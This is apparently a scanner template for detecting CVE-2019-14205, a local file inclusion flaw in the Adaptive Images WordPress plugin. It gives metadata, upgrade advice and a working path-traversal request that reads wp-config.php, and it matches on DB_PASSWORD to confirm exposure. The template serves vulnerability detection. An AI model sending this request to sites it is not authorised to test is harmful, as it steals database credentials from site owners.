info:
  id: CVE-2019-14205
  name: WordPress Ext Adaptive Images LFI
  author: Hung, Dat, Hoa, Danh
  severity: high
  description: A Local File Inclusion vulnerability in the Nevma Adaptive Images plugin before 0.6.67 for WordPress allows remote attackers to retrieve arbitrary files via the $REQUEST['adaptive-images-settings']['source_file'] parameter in adaptive-images-script.php.
  remediation: Upgrade to version 0.6.67 or later.
  reference:
    - https://github.com/security-kma/EXPLOITING-CVE-2019-14205
    - https://markgruffer.github.io/2019/07/19/adaptive-images-for-wordpress-0-6-66-lfi-rce-file-deletion.html
    - https://wordpress.org/plugins/adaptive-images/#developers
    - https://github.com/markgruffer/markgruffer.github.io/blob/master/_posts/2019-07-19-adaptive-images-for-wordpress-0-6-66-lfi-rce-file-deletion.markdown
  classification:
    cvss-score: 7.5
    cve-id: CVE-2019-14205
    cwe-id: CWE-22
  tags: cve,cve2019,wordpress,wp-plugin,lfi

requests:
  - request:
    - |
      GET /wp-content/plugins/adaptive-images/adaptive-images-script.php?adaptive-images-settings[source_file]=../../../wp-config.php HTTP/1.1
      Host: {{Hostname}}

    multipleMatcher: and
    matchers:
      - type: word
        part: body
        word:
          - "DB_NAME"
          - "DB_PASSWORD"
        condition: and

      - type: status
        status:
          - 200